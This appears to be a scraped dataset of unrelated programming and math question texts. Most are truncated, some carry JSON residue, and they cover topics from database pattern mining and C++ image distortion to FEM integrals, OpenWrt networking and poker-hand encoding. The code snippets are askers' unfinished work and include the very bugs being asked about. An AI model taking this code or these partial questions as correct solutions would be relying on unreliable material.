DB has about 90 million entries.The main goal is to find different patterns in columns to leverage it for create look alike data. The data columns has entries which can easily look like patterns as : CUST1212,CUST1213,CUST1214...,  number sequential after CUST CODE1213,CODE1242,CODE1289...   random numbers after code CUST1213,MUST8324,FIFA12313...   009-123-2123,003-124-2314,006-213-5322, INTER122,INTER222,INTER322...,  number increasing in batch of 100 OM|ON|TO, IO|OI|UH...,  pipe delimited  some 6 and 7 digits number.The issue is there are so many patterns and looks like creating patterns manually based on data is out of option.I would really appreciate if one can point to how can I build a collection of patterns preferably by usage frequency.What I started is 1. Segregate the data as per their length as patterns usually generate same string length, sorted them and stored them in different files. 2. Then classifying them further as per Alphabet prefix or numeric prefix. 3. For alpha-prefix segregate further on common alphabets at start.Now seems I am lost and sincerely hoping if one can point out to me what are my options and probably best to took.I believe if end of computation if get something like patterns in data and their frequency e.g. CUST[0-9]{4} -> 10k times, [a-zA-Z]{4} -> 50k times [0-9]{3}-[0-9]{3}-[0-9]{4} 10K times etc....., it would be great.Thanks",

Removing the matrix creation routines caused by matrix operations here increased my speed by 4.When profiling this code (I'm forced to use Windows + MingW for this, so I don't have many convenient profiling options; I've been using gprof) it looks like tan, cos, sin, and atan2 take up the vast majority of the time at -O3, with atan2 cos and sin each taking about 20% of the time.Here is the full implementation to give context:double BarrelAbberationClass::toDistortedRadius(const double r) const {    return m_focal_length * atan2(r, m_focal_length);}cv::Vec2d BarrelAbberationClass::transformBackward(const cv::Point &source_xy,                                               const cv::Mat &affine, const cv::Vec2d &center) {    const double x_affined = source_xy.x * affine.at<double>(0, 0) + affine.at<double>(0, 2);    const double y_affined = source_xy.y * affine.at<double>(1, 1) + affine.at<double>(1, 2);    const double r = std::hypot(x_affined, y_affined);    const double new_r = toUnDistortedRadius(r);    const double new_i = center[1] + (new_r / r) * y_affined;    const double new_j = center[0] + (new_r / r) * x_affined;    return cv::Vec2d(new_j, new_i);}double bilinearInterpolate(const cv::Mat &cv_source, const float x, const float y) {    const int px = static_cast<int>(x);    const int py = static_cast<int>(y);    const double p1 = cv_source.at<double>(py, px);    const double p2 = cv_source.at<double>(py, px + 1);    const double p3 = cv_source.at<double>(py + 1, px);    const double p4 = cv_source.at<double>(py + 1, px + 1);    const float fx = x - px;    const float fy = y - py;    const float fx1 = 1.0f - fx;    const float fy1 = 1.0f - fy;    const float w1 = fx1 * fy1;    const float w2 = fx * fy1;    const float w3 = fx1 * fy;    const float w4 = fx * fy;    return p1 * w1 + p2 * w2 + p3 * w3 + p4 * w4;}double BarrelAbberationClass::toUnDistortedRadius(const double r) const {    return m_focal_length * tan(r / m_focal_length);}cv::Point BarrelAbberationClass::transformForward(const cv::Point &source_xy,                                              const cv::Vec2d &center) {    const double x_translated = source_xy.x -center[0];    const double y_translated = source_xy.y -center[1];    const double r = std::hypot(x_translated, y_translated);    const double new_r = toDistortedRadius(r);    const uint64_t new_i = static_cast<uint64_t>(center[1] + (new_r / r) * y_translated);    const uint64_t new_j = static_cast<uint64_t>(center[0] + (new_r / r) * x_translated);    return cv::Point(new_j, new_i);}cv::Mat BarrelAbberationClass::getScaleMatrix(const cv::Rect &bounds,                                          const cv::Vec2d &center) {    const cv::Point new_tl = transformForward(bounds.tl(), center);    const cv::Point new_br = transformForward(bounds.br(), center);    const cv::Point diff = new_br - new_tl;    const double scale_x = diff.x / static_cast<double>(bounds.width);    const double scale_y = diff.y / static_cast<double>(bounds.height);    const double scale = scale_x > scale_y ? scale_x : scale_y;    cv::Mat scale_matrix = (cv::Mat_<double>(3, 3) << scale, 0, 0,            0, scale, 0,            0, 0, 1);    return scale_matrix;}cv::Mat& BarrelAbberationClass::calculateAberation(cv::Mat& imageData) {    const double center_x = imageData.size().width / 2;    const double center_y = imageData.size().height / 2;    const cv::Vec2d center(center_x, center_y);    const cv::Mat translate = (cv::Mat_<double>(3, 3) << 1, 0, -center_x,                                                         0, 1, -center_y,                                                         0, 0, 1);    const cv::Mat cpy = imageData.clone();    imageData.setTo(cv::Scalar(0));    const cv::Rect bounds(cv::Point(), cpy.size());    const cv::Mat scale = getScaleMatrix(bounds, center);    const cv::Mat affine = scale * translate;    for (uint64_t i = 0; i < cpy.rows; ++i) {        for (uint64_t j = 0; j < cpy.cols; ++j) {            const cv::Vec2d new_dpoint = transformBackward(cv::Point(j, i), affine, center);            const cv::Point new_point = {new_dpoint[0], new_dpoint[1]};            if (bounds.contains(new_point)) {                imageData.at<double>(i, j) = bilinearInterpolate(cpy, new_dpoint[0], new_dpoint[1]);            }        }    }    return imageData;}Here is the .h fileclass BarrelAbberationClass{protected:    const double m_focal_length;public:    BarrelDegredation(const double focal_length) : m_focal_length(focal_length) {};    cv::Mat& calculateAberation(cv::Mat& imageData);    double toDistortedRadius(const double r) const;    double toUnDistortedRadius(const double r) const;    cv::Point transformForward(const cv::Point &source_xy, const cv::Vec2d &center);    cv::Mat getScaleMatrix(const cv::Rect &bounds, const cv::Vec2d &center);    cv::Vec2d transformBackward(const cv::Point &source_xy,                                const cv::Mat &affine, const cv::Vec2d &center);}",

How I plan to do itSuppose that the following transformation is used to transform a general triangular element K to the standard triangular element $T_{st}$ :$$ x = P(\\xi,\\eta) $$$$y = Q(\\xi,\\eta)$$This corresponds to this physical mapping in fact:Then we have:$$dx = \\frac{\\delta x}{\\delta \\xi}d\\xi + \\frac{\\delta x}{\\delta \\eta}d\\eta = J_{11}d\\xi + J_{21}d\\eta $$$$dy = \\frac{\\delta y}{\\delta \\xi}d\\xi + \\frac{\\delta y}{\\delta \\eta}d\\eta = J_{12}d\\xi + J_{22}d\\eta $$Along the side $P_{1} - P_{2}$, the coordinate $\\xi$ is in fact always fixed. So we can write $d\\eta = 0$ . Using this it comes:$$ dx = (\\frac{\\delta x}{\\delta \\xi})_{\\eta = 0} \\ d\\xi  = J_{11}(\\xi,0) d\\xi $$$$ dy = (\\frac{\\delta y}{\\delta \\xi})_{\\eta = 0} \\ d\\xi  = J_{12}(\\xi,0) d\\xi $$Therefore:$$ ds = \\sqrt{J_{11}^{2}(\\xi,0)+ J_{12}^{2}(\\xi,0)} d\\xi $$So we can rewrite the integral with a variable change accordingly:$$\\int_{P_{1}}^{P_{2}} 4x + y \\ ds = \\int_{0}^{1} B(P(\\xi,0),Q(\\xi,0)) \\ \\sqrt{J_{11}^{2}(\\xi,0)+ J_{12}^{2}(\\xi,0)} d\\xi $$Using this isoparametrical formulation, we can finally compute the numerical integral thanks to a 4 node quadrature :$$ I = \\sum_{i=1}^{gauss \\ point} w_{i} B(P(\\xi_{i},0),Q(\\xi_{i},0)) \\ \\sqrt{J_{11}^{2}(\\xi_{i},0)+ J_{12}^{2}(\\xi_{i},0)} d\\xi $$This can be done with this really simple code in Python (at least I was thinking):Edit of the code : 20.07.2017 => removed an error (dividing by two without reason)# -*- coding: utf-8 -*-from __future__ import division # avoid integer problem of division#Import zoneimport numpy as npimport math#Define shape functiondef P1shapes(r,s):    S = np.array([1-r-s,r,s])    dSdr = np.array([-1,1,0])    dSds = np.array([-1,0,1])    return S,dSdr,dSds#Jacobian functiondef isopmap(x,y,r,s,shapefcn):    # x = vector of x coordinate of the element's point    #shapefcn = P1shapes    S,dSdr,dSds = shapefcn(r,s);    j11=np.dot(dSdr,x)    j12=np.dot(dSdr,y)    j21=np.dot(dSds,x)    j22=np.dot(dSds,y)    detJ=j11*j22-j12*j21    dSdx=( j22*dSdr-j12*dSds)/detJ    dSdy=(-j21*dSdr+j11*dSds)/detJ    return S,dSdx,dSdy,detJ,j11,j12,j21,j22#Gauss point quadratureqwgts=np.array([-27/48,25/48,25/48,25/48])rspts=np.array([[1/3,1/3],[0.2,0.2],[0.6,0.2],[0.2,0.6]])def B(x,y):    z = 4 *x + y    return z#Point of the 3 nodes triangles (test case)x = [-2, 1 ,-1]y = [-1 ,2 ,3]#P1-P2int_total = 0#Begin integral on segmentfor q in range(len(qwgts)):    r = rspts[q,0] # r coordinate of the q_th quadrature point    s = rspts[q,1] # s coordinate of the q_th quadrature point    #Define ds and Map x_physical, y_physical    S,dSdx,dSdy,detJ,j11,j12,j21,j22 = isopmap(x,y,r,0,P1shapes)    ds = math.sqrt(math.pow(j11,2) + math.pow(j12,2))    x_physical = np.dot(x,S)    y_physical = np.dot(y,S)    B_gausspoint = B(x_physical,y_physical)    wxarea = B_gausspoint*qwgts[q]*ds    int_total += wxareaprint int_totalThe result gives:$$ I =  -16.97 $$Of course if I change the third point of the triangle, it should change nothing. With this:x = [-2, 1 ,-1]y = [-1 ,2 ,7]We again find for the path $P_{1} - P_{2}$:$$ I =  -16.97 $$What we should expectFrom an analytical point of view we have for the parametrisation $x = -2 + 3t$ and $y = -1 + 3t$. This allow to have:$$ds = \\sqrt{   (\\frac{dx}{dt})^{2}  +  (\\frac{dy}{dt})^{2}} \\ dt = 3\\sqrt{2} \\ dt$$So we have: $$\\int_{P_{1}}^{P_{2}} 4 x + y \\ ds = \\int_{0}^{1} 4(-2+3t) + (-1+3t)) \\ 3\\sqrt{2} \\ dt = -6.36$$Actually, we can see that the numerical method is not working...My questionDid I make a mystake in the main concept? Is it an implementation error?I think it could be an interesting question for all the people that try to implement a path integral on a FEM mesh.I really did'nt find litterature example to check my implementation.Extension of the questionIs there an other way/more elegant way to compute a path integral on the boundary of my FEM model? It seems that I have everything (non linear solver, quadrature integral for assembly of stiffness matrix, shape function, isoparametric formulation), but I'm really stuck at this point. Without this I never would be able to compute for example:$$ R_{ij} = \\int \\kappa(x,y) \\ \\phi_{i} \\ \\phi_{j} \\ dS \\ for \\ i \\ = \\ 1,2 $$EDIT 20.07.17 : Additional testActually, if we take for the integral $B(x,y) = 1$, we are integrating the length of the path :def B(x,y):    z = 1    return zIf we run the code, we end up with :$$ I = 4.24$$Which is the correct value since the length of the path:$$\\sqrt{(P_{2}^{x} -P_{1}^{x})^{2} + (P_{2}^{y} -P_{1}^{y})^{2} } = 4.24$$Thank you in advance.

    "source": "a few questions on understanding geometric conservation law <eos> I was wondering if anyone could help with understanding the geometric conservation law for moving domains. I came across Link1, and have tried to understood the paper by Farhat et al Link2. So far my understanding is that the two things to consider are 1) the time step to which the cell areas using for integration of flux terms correspond to; 2) the time step at which the mesh velocity ( $\\dot{x}$ ) is being evaluated. Finally, the ALE equations must also be satisfied for a uniform flow case. The paper states a GCL law as:$$A_{i}x^{n+1}-A_{i}x^{n}=\\int_{t^{n}}^{t^{n+1}}\\int_{\\partial C_{i}(x)}\\dot{x}\\overrightarrow{n}d\\sigma dt$$where $A$ refers to the area of cells, $C$ refers to the cell areas swept by the  fluxes, t is time, x is the spatial coordinate at the current configuration, and I think $\\sigma$ refers to the surface area of integration corresponding $C$. I have a few questions that I would really appreciate some help with:1)  what is $C$ in 1D. Is C referring to the length of the cells or the area, which is set to 1 in 1D.2) in the paper (just before equation 16), for a uniform flow, it sets the variables being solved for at different time steps equal to each other. Is that not the definition of steady flow?3) Finally, is there a way to determine whether a set of numerical results in 1D, obey GCL or not, without actually going through the equations. For instance, my understanding is that the results should stay independent of the moving domains, so if I compared the results obtained using  $\\dot{x}$ =0 and $\\dot{x} \\neq 0$ and showed that they were not the same?If there are any simpler papers or examples on GCL, please let me know.

I have a class WebService which offers methods like CreatePDF.Here's a little example:The Model:The model contains a number of properties, which each represent a URL parameter of the webservice. The models provide a method GetParameterDictionary, which delivers a dictionary with key == url parameter name and value == url parameter value.public class CreatePDFParameters{        public List<string> Names { get; set; }        public List<string> Colors { get; set; }        public Dictionary<string, string> GetParameterDictionary()        {            [...] //returns Key == url parameter name and Value == ; separated list of values        }}So here's a example for the Interface method:public byte[] CreatePDF(CreatePDFParameters parameters){    return MakeByteRequest(GetQuery(WebServiceMethods.CreatePDF, parameters.GetParameterDictionary()));}/// <summary>///     Creates a query out of a dictionary. The dictionary must have the paramname as key and the value as value!/// </summary>private string GetQuery(string methodName, Dictionary<string, string> parameters){    string parameterString = parameters.Where(parameter => !String.IsNullOrEmpty(parameter.Value))    .Aggregate(String.Empty, (current, parameter) => String.Format(String.IsNullOrEmpty(current) ? {0}?{1}={2} : {0}&{1}={2}, current, parameter.Key, parameter.Value));    return methodName + parameterString;}As you can see, you only need to call the CreatePDF method with a parameters object. The method itself calls a methods, which creates the query and calls a method, which makes the actual request (It calls directly the ByteRequest method, there are methods like StringRequest (delivers a string as return value) too).I would like to write a UnitTest for the GetQuery method. But I don't want to make it public or internal in the actual state. I could make the method public If I would remove the CreatePDF method and let the user make direkt calls to MakeByteRequest / GetQuery and so on - which would require the users to have some knowledge about the webservice itself (knowledge about return types, web method names and so on).Would you prefer a more simple interface over unit tests in this case?",

It is definitely only a proof of concept at this point, but if it's a good idea I would pursue the development into a more mature product.  There are three main parts of this concept (maybe they should be separate questions, but I am asking about the concept as a whole and whether it conforms to acceptable standards or is just a bad idea):Create a single file Python interpreter (sort of) which will be compiled with pyinstaller for various platforms and included with the distribution of the app. This allows a completely pluggable system of command line utilities written in Python.Create a library which provides a decorator which creates a command line interface dynamically based on the function signature.Provide a production-ready server based on Bottle and CherryPy which serves a Web GUI based on a very simple plugin system.To this end I created a project on GitHub, and I would recommend looking at the structure and source code there, but I am including the most relevant pieces of code here as per the recommendations of the moderators.This is the code in magic.py which executes the python scripts. Note that the main point of this is to compile this code with pyinstaller so there is a one-step build process and it provides a pluggable system of command line utilities (also note the ellipses):# I want to make __future__ available, but it must be at the beginning.import __future__from config import get_configimport loggingimport sysimport osif False:    # The following modules (even though they are not actually imported)    # are meant to be available.

I built image a few years ago using revision 39392 and patch firmwared it and everything worked fine. Just a few months ago I decided to update firmware. So I did it and discovered that physical network is completely broken. I have over 90% packet loss via ethernet ports, though wifi works perfect . I thought that I messed up while build. So I firmwared 2 different images from download.openwrt and a couple  more that I built by myself, but symptoms are always the same. I wanted to try worked for me svn revision but unfortunately this patch is unavailable so I can't firmare image back. The funny thing that everything including physical ports works while netbooting via vmlinux-initramfs (bootp) the same build revision.  Since vmlinux works fine I suspect that flash is damaged so I made myself sure that files from rootfs.tar.gz and firmwared ones are the same.  On the next step I compared the loaded demons on vmlinux-initramfs and firmwared system, the firmwared one has extra listed below:nf_log_common.konf_log_ipv4.konf_log_ipv6.konf_nat_masquerade_ipv4.konf_reject_ipv4nf_reject_ipv4.konf_reject_ipv6nf_reject_ipv6.konls_base.koPreventing them from loading doesn't help.

In thisalgorithm, I considered the inverse problem of reconstructing all integer sets which realize a given distance multiset. i.e. :Inputs: $D=\\{p_ip_j \\mod N, ij \\},K $Output : $P=\\{p_1,p_2,...,p_K\\},\\qquad p_i \\in \\{0,1,2,...,N-1\\},\\qquad p_i > p_j $ for $i>j$Simply saying, the algorithm puts $K$ blanks to be filled. Initially, puts 1 in the first blank. For the second blank it looks for the first integer that if we add to P, it doesn't produce any difference exceeding the existent differences in $D$. Then, it does so, for next blanks. While filling a blank if it checked all possible integers and found no suitable integer for that blank, it turns back to the previous blank and looks for next suitable integer for it. If all blanks are filled, it has finished his job, otherwise it means that there weren't any possible $P$'s for this $D$.Here's my analysis so far.Since the algorithm checks at most all members of $\\{2,...,N\\}$ for each blank (upper bound) there is $N-1$ search for each blank. If each visited blank was filled in visiting time, the complexity would be $O((K-1)(N-1))$ since we have $K-1$ blank (assuming first one is filled with 1). But the algorithm is more complex since for some blanks it goes backward and some blanks may be visited more that once. I'm looking for the worst case complexity i.e. the case that all blanks are visited and no solution is found.",

So I've set it up via playonlinux (using wine version 1.8-staging as recommended by a friend).Some of my keybinds have changed, however. On windows, I have one keybind as backslash ('\\') which I use incessantly, and several more as AltGr+, for example AltGr+K, L, Y and so on. These work fine on Windows.However, when I load SWTOR on linux - having installed the EXACT same keybind/interface files (and I know it found them because my chatbox and interface are exactly as they should be, which they weren't before I transferred those configs) - the slot which should be bound to \\ is now bound to #. Attempting to bind it back, I found that it won't even register \\ in the binding dialog box. However, I can easily type backslashes into chat messages, and I can confirm from xkey that the keypress is sent to SWTOR.A similar story with AltGr: using AltGr+F actually invokes the keybind associated with F, and attempting to bind it back just binds it to F instead. I can't check by typing it in chat, but I verified with xkey that the keypress is sent to the window by X. The bindings are still listed with Ctrl+Alt+F, and indeed I can invoke it like that (it's just how it comes up on windows).The weirdest thing about this is that it automatically rebound the \\ binding to #, with no editing of configs and no manual rebinding (and that I can still type \\ into chat, so it's clearly receiving the keypresses). And yet it works fine on Windows.Can anyone shed any light on where these problems are occurring and what might help fix them?I'm running playonlinux 4.2.10 installed from the official website, using the SWTOR script listed when you search for it and the installer from the official swtor.com website.

They are positioned in certain ways thereby turning certain Glines and/or GArcs on or off (changing visiblity) would create a pattern for a letter. This Gletter uses the if/else statements to determine which pattern to create - this makes me feel my code is too long.There is another class (DrawInitials.java) that simulates a GraphicsProgram and allows the user to pass certain letters as arguments to the GLetter object. I've used 'L' and 'O' as examples.However, I posted this because I'm not sure I'm using the right approach. That's why I need your help.I feel MY CODE IS TOO LONG!The code above is not the complete project...it only draws letters 'L' and 'O' for now.",

In case of high-level language like C++, that is generated by linker above. So assembler is not used anywhere. So how can it create an object file as written above? Intermediate code is generated to make the code run on different architectures.Question 2: Are *.class (bytecode) files created by java compiler object files? If yes, then can we say that the JVM that runs them is a type of linker (however its not creating the executable)?Question 3: When we compile a C++ program in Turbo C++, we get *.obj files which are the object files.

What is the least amount of bits to represent a 5 card hand and how?A hand is NOT order dependent (KQ = QK).  64329 = 96432Yes, can use 52 bits. That can represent a hand of any number of cards.  Given a hand is exactly 5 cards is there a way to represent it with less than 52 bits. A single card can be represented with 6 bits = 64.  So could just use 6 bits * 5 cards = 30 bits.  But that would be order dependent.  I could just sort and this should work. If that would not work please let me know.   Is there a way to get the key to 32 bits or under and not have to sort the 5 card tuple.  This is for poker simulations and sorting would be a lot of overhead compared to just generating the hand.  If I have a dictionary with the relative value of each hand it is two simple lookups and a comparison to compare the value of two hands. If I have to sort the hands first that is large compared to two lookups and a comparison.  In a simulation will compare millions.  I will not get sorted hands from the simulation.  The sort is not simple like 52 51 50 49 48 before  52 51 50 49 47.  You can have straight flush quads ....There are 2598960 possible 5 card hands.  That is the number of rows.  The key is the 5 cards.  I would like to get a key that is 32 bits or under where the the cards do not need to be sorted first.  Cannot just order the list as many hands tie. Suit are spade, club, diamond, and heart.  7c 8c 2d 3d 4s = 7s 8s 2c 3c 4h.  There is a large number of ties.The next step is 64 bits and will take the hit of the sort rather than double the size of the key.  I tested and SortedSet<int> quickSort = new SortedSet<int>() { i, j, k, m, n }; doubles the time of the operation but I still may do it.It gets more complex. I need to be able to represent a boat as twos over fives (22255).  So sorting them breaks that. I know you are going to say but that is fast.

The idea is that Google will only index fewer, higher quality 'view-all' pages, but users will be able to drill down and refine their results to get very specific.The question however is whether or not this is a correct use of the canonical and whether it will lead to the desired effect?EDITIt doesn't matter if google indexes 'dirty' URLs with parameters (though it should index the clean one when theres one available).

The web sites use Apache, PHP, and MySQL. To be clear, my Apache server is not serving these sites to the internet, I just access them locally.I develop on two machines. One desktop, and one laptop. Both are running Linux Mint, and I try to keep the settings consistent between them. This means I have to duplicate the Apache and PHP configurations. I keep the directory structures the same. I have to make sure to copy the MySQL databases from one machine to the other if I make changes.Which is not ideal. It's prone to human error, especially with keeping the MySQL databases synched. Sometimes I work on one on one machine, forget to export and import the databases, and then after I've done work on the other machine, I have two versions and I can't easily merge them. Also, it's a hassle for making backups.What does work is that I store all my HTML, CSS, and Javascript in a folder in my Dropbox directory. So any changes I make to those files are automatically syncronized. It also means I have a backup in the cloud. Should the need arise, to restore these files if I ever move to a new machine, I just have to install Dropbox and all the files are recovered.The most I have to do if setting up on a new computer is create a symlink to my Dropbox directory where my HTML files are stored:sudo ln -s  /home/dave/Dropbox/Websites /var/www/WebsitesIs there a way I can do this with my Apache settings and MySQL databases as well? Where I can keep them synchronized across both machines in my Dropbox folder, and have a miminum of set up if I go to a new machine?",

I'm very confused with the results I'm getting though.I took this Homogeneous Coordinates technique from an online lecture. If I understood correctly, the objective is to transform every point inside a Viewing Pyramid that's frustum shaped so they fit in a cube. (Image from of songho.ca)               You need a Field of View angle ($\\alpha$), the Near and Far plane distances ($n$ and $f$ respectively), and the aspect ratio ($r$). Firstly you turn every 3D Point into a Homogeneous Point by adding  a 1 like so:\\begin{align*}\\begin{pmatrix}  x & y & z\\end{pmatrix}\\xrightarrow{\\text{4D}}\\begin{bmatrix}  x & y & z & 1\\end{bmatrix}\\end{align*}Then you multiply your point matrix by a perspective projection matrix:\\begin{align*}\\begin{bmatrix}x & y &z & 1 \\end{bmatrix}\\begin{bmatrix}  1\\over\\tan(\\alpha/2) & 0 & 0 & 0\\\\   0 & r\\over\\tan(\\alpha/2) & 0 & 0\\\\  0 & 0 & (f+n)\\over(f-n) & -1 \\\\  0 & 0 & (2nf)\\over(f-n) & 0\\end{bmatrix}=\\begin{bmatrix}x' & y' & z' & w\\end{bmatrix}\\end{align*}And to go back to a 3D point in space you divide by the fourth dimension:\\begin{align*}\\begin{bmatrix}  x' & y' & z' & w\\end{bmatrix}\\xrightarrow{\\text{3D}}\\begin{pmatrix}  x' \\over w & y' \\over w & z' \\over w\\end{pmatrix}\\end{align*}This is exactly what I've done with numpy:def projection_matrix(fov, aspect, near, far):    t = 1/math.tan(math.radians(fov)/2)    a = (far + near)/(far - near)    b = (2*near*far)/(far-near)    r = aspect    return numpy.matrix([[t,   0,   0,   0],                         [0, r*t,   0,   0],                         [0,   0,   a,  -1],                         [0,   0,   b,   0]])But for some reason the renderer is totally messed up.

The action set $A^t\\in\\mathcal{A}$ is the action set chosen by players at time $t$. After the period $T$ (every player has chosen an action). So I get $u_i(A^t)$.Now the regret of player $i$ of not playing action $a_i$ in the past is: (here $A^t\\oplus a_i$ denotes the strategy set obtained if player $i$ changed its strategy from $a'_i$ to $a_i$)$$\\max\\limits_{a_i\\in A_i}\\left\\{\\dfrac{1}{T}\\sum_{t\\leqslant T}\\left(u_i(A^t\\oplus a_i )-u_i(A^t)\\right)\\right\\}.$$I do not understand how to calculate this summation. Why there is a max over the action $a_i\\in A_i$? Should I calculate the regret of all actions in $A_i$ and calculate the maximum? Also, In Hart's paper, the maximum is $\\max\\{R, 0\\}$. Why is there such a difference?

    "source": "How do I Integrate Production Database Hot Fixes into Shared Database Development model? <eos> We are using SQL Source Control 3, SQL Compare, SQL Data Compare from RedGate, Mercurial repositories, TeamCity  and a set of 4 environments including production. I am working on getting us to a dedicated environment per developer, but for at least the next 6 months we are stuck with a shared model.  To summarize our current system, we have a DEV SQL server where developers first make changes/additions.  They commit their changes through SQL Source Control to a local hgdev repository.  When they execute an hg push to the main repository, TeamCity listens for that and then (among other things) pushes hgdev repository to hgrc.  Another TeamCity process listens for that and does a pull from hgrc and deploys the latest to a QA SQL Server where regression and integration tests are run.  When those are passed a push from hgrc to hgprod occurs.  We do a compare of hgprod to our PREPROD SQL Server and generate deployment/rollback scripts for our production release.Separate from the above we have database Hot Fixes that will need to be applied in between releases.  The process there is for our Operations team make changes on the PreProd database, and then after testing, to use SQL Source Control to commit their hot fix changes to hgprod from the PREPROD database, and then do a compare from hgprod to PRODUCTION, create deployment scripts and run them on PRODUCTION.If we were in a dedicated database per developer model, we could simply automatically push hgprod back to hgdev and merge in the hot fix change (through TeamCity monitoring for hgprod checkins) and then developers would pick it up and merge it to their local repository and database periodically.  However, given that with a shared model the DEV database itself is the source of all changes, this won't work. Pushing hotfixes back to hgdev will show up in SQL Source Control as being different than DEV SQL Server and therefore we need to overwrite the reposistory with the change from the DEV SQL Server. My only workaround so far is to just have OPS assign a developer the hotfix ticket with a script attached and then we run their hotfixes against DEV ourselves to merge them back in.  I'm not happy with that solution.  Other than working faster to get to dedicated environment, are they other ways to keep this loop going automatically?",

Thus, if the only books which discuss this are not introductory, I would be grateful for answers that both list such books discussing exponential notation blow-up as well as introductory books that will prepare for the books which directly address my question.Context: This question is inspired primarily by an answer on Physics.SE, which says that:It is very easy to prove (rigorously) that there is no parentheses notation which reproduces tensor index contractions, because parentheses are parsed by a stack-language (context free grammar in Chomsky's classification) while indices cannot be parsed this way, because they include general graphs. The parentheses generate parse trees, and you always have exponentially many maximal trees inside any graph, so there is exponential redundancy in the notation.Throughout the rest of the answer, other examples of exponential notation blow-up are discussed, for example with Petri Nets in computational biology.There are also other instances where mathematical notation is difficult to parse, for example as mentioned here when functions and functions applied to the argument are not distinguished clearly. This can become especially confusing when the function becomes the argument and the argument becomes the function, e.g. here.",

If creativity imbues their design, its not because humans put it there. One way to understand this is that even small Turing machines can encode profound mathematical problems. Take Goldbachs conjecture, that every even number 4 or higher is a sum of two prime numbers: 10=7+3, 18=13+5. The conjecture has resisted proof since 1742. Yet we could design a Turing machine with, oh, lets say 100 rules, that tests each even number to see whether its a sum of two primes, and halts when and if it finds a counterexample to the conjecture. Then knowing BB(100), we could in principle run this machine for BB(100) steps, decide whether it halts, and thereby resolve Goldbachs conjecture. Aaronson, Scott. Who Can Name the Bigger Number? Who Can Name the Bigger Number? N.p., n.d.

After opening it again to create a new version, it opened to what I thought was a blank page. There was now page after page of blank canvas, with the project in the lower right corner.I tried to go to Document Properties Custom but that didn't remove the blank pages. There is no obvious way to remove them. The structure chart content is neatly within the one page, so I don't see why it would automatically add more. The main problem is that I can't print or save because the file is so large my laptop freezes or otherwise stalls when trying to print or save as a pdf.How can I remove these blank pages?",

Problems arise when multiple developers concurrently work on non-trivial tasks and end up making changes to the DB that interfere with each other. The 'non-trivial' bit is significant because if the tasks take long enough, and if DB changes occurr early enough in the cycle, neither dev ends up being aware of the other's changes, and we end up with either a DB merge nightmare (preferred case) or an inadvertently broken database.Can these situations be easily avoided? Are there database refactoring strategies that effectively handle the scenario of multiple developers actively changing the schema?If it matters, we use SQL Server.",

    "source": "How to model reversible interactive programs <eos> Reversible programs with finite execution steps are well studied. For example, a Turing machine whose transitions are reversible and halts can be executed backwards consuming its tape in the reverse order. A variant of Turing machines with distinct input, output, and work tapes can be similarly executed in reverse to consume its output and regenerate its input, assuming it halted with an empty work tape in the forward execution (to avoid the possibility of stashing input information in the work tape).Is there any work for the equivallent concepts in the setting of interactive programs (in the spirit of https://en.wikipedia.org/wiki/Interactive_computation)? In the three-tape Turing machine model described, it is clearly possible to have infinite interactive runs consuming an infinite input stream and emitting an infinite output stream while storing intermediate results in the work tape. Some of these programs are clearly reversible in an analogous way to the finite programs, but cannot be covered by that formalism if they are non-halting. How can we characterize reversible interactive programs in this model? We need to exclude programs that simply stash away their input in the work tape, but unlike the finite case, we can't simply require that the program ends with an empty work tape.Is there any work on such reversible interactive programs?",

Two sentences S1 and S2 they are at edit distance 1 if S1 can be transformed to S2 by: adding, removing or substituting a single word.I am then given a large txt file that contains about $10^6$ sentences.The way I tried to attack this problem:Observation $1$: If the length of two sentences is greater then $1$ then they are not at an edit distance $1$.Observation $2$: Let $A_1,...,A_5$ be five consecutive words from a sentences and let $B_1,...,B_5$ be another five consecutive words chosen from different indexes (that is if we label the words of a sentence then $B_i$ and $A_j$ does not share an index.Five is a small arbitrary number I choseI used something like a curried syntax to get a hashtable that keeps a 3-touple: $(X,Y,Z)$Where I mapped each sentence as follows:$X$ is the number of words the sentence have.$Y$ is obtained by a hash function on the content of the words (I will soon describe this hash function)$Z$ is a list of integers containing the index of the line in the document [the line number] that was mapped to $(X,Y)$In C# this corresponds to an object of a type Dictionary< int, Dictionary< int, List< int>>>So I kept two Hashtables of the above form, where I took the first five words to hash and get $Y$ and words $6-10$ to hash and get another value of $Y$.Then given a sentence - compute the two $Y$ values it would of gotten and look at buckets with length that differs at at most $1$ from this sentence length and share one $Y$ value this sentence.Let me describe the hashing function I used to get $Y$ -I took the $A_i$ (similarly with the $B_i$) and concatenated them I looked at this string as a byte array (that is by the bits that takes to represent the numbers) I then applied a the SHA-1 hash function on it (there are no security reasons for this but I wanted something that hashes well) I took the last $4$ bytes in the SHA-1 hash and I looked at it as a positive integer (by looking at the last $32$ bits and considering it as an integer then applying the absolute value function). Call this result $R$$Y= R\\%p^{2}$where $p$ was chosen as follows: I counted how many lines of a given length $l$ appear (say $n_l$), for lines of length $l$ I chose $p$ s.t $$\\frac{n_l}{p^2}\\leq 3$$ the following is a Histogram showing $n_l$ as a function of $l$which should give some indication of the values chosen for $p$.However - There are too many collisions - I get about $6$ elements in each bucket.I took one example of such a bucket and I printed those sentences (I hoped they are similar so they would have a good reason to be mapped to the same bucket) by they are very different from one another. This is a printscreen of those sentences printed to the console.Question: Why do I get a large number of collisions ?($6$ in average on $10^5$ buckets I considered where if I had even distribution I would expect $3$ from the choice of $p$, some buckets have a few tens of elements in them) Could the problem be that I used modulo a square of a prime and not a prime ? is it that significant?",

However, the fact that this implementation of the Config interface exists can be missed by other developers working with the code.I'm trying to find a way to make the reusable null-representation of the Config easy to find.It occurred to me that I could expose it using the interface itself:public interface Config {    Something process();    MISSING = MissingConfig.INSTANCE;}so that it would auto-complete for everyone trying to do something with ConfigThis, however, in a way, introduces a constant in the interface, which is advised against in Joshua Bloch's Effective Java (Chapter 4, item 19)Another way to structure the code that occurred to me is to define the enum inside the interface.public interface Config {    Something process();    public enum Missing implements Config {        INSTANCE;        @Override        public Something process() {            // do no harm        }    }}This looks almost as readable when consumedConfig.Missing.INSTANCEbut not as nice as the previous version... and technically, this is still a constant defined inside an interface. Just a bit more convoluted.Is there any way I can make the consumption of the null-object blatantly obvious without violating the good practices of interface design... or am I trying to have my cake and eat it too?I'm beginning to think my original implementation (with the enum defined in its own file) is the most elegant one and that the discoverability should be achieved by an explicit mention of it in the Javadoc. As much as I'd love to, I can't protect myself against people who don't read javadocs.I have also thought about switching from an interface to an abstract class but that limits reuse in ways I cannot accept due to single inheritance (some existing code that has to do with the Config)Hope this isn't too open-ended for Programmers",

